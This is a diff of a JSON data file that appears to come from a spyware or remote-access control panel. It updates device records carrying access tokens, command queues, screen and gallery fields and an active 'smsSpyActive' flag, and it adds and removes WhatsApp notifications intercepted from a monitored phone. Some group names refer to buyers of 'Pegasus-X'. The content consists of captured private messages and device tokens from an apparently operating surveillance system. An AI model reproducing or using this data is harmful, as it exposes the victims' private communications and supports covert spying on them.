@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775853107,
+    "lastSeen": 1776775859179,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3721 pesan dari 21 chat",
+        "time": "21/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775860321
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (194 pesan): ~ -Pr1nce★!🦸",
+        "content": "Dia lagi sapr",
+        "time": "21/04 19:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775860253
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3720 pesan dari 21 chat",
+        "time": "21/04 19:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775853615
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (193 pesan): ~ -Pr1nce★!🦸",
@@ -10304,30 +10328,6 @@
         "time": "21/04 19:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774173767
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3615 pesan dari 23 chat",
-        "time": "21/04 19:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774171679
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (15 pesan): ~ Ajm",
-        "content": "Nt aja ntr di kick",
-        "time": "21/04 19:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774171659
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (14 pesan): ~ Ajm",
-        "content": "Belum di balas",
-        "time": "21/04 19:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774161040
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775851222,
+    "lastSeen": 1776775859804,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775851436,
+    "lastSeen": 1776775857389,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775852399,
+    "lastSeen": 1776775858488,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
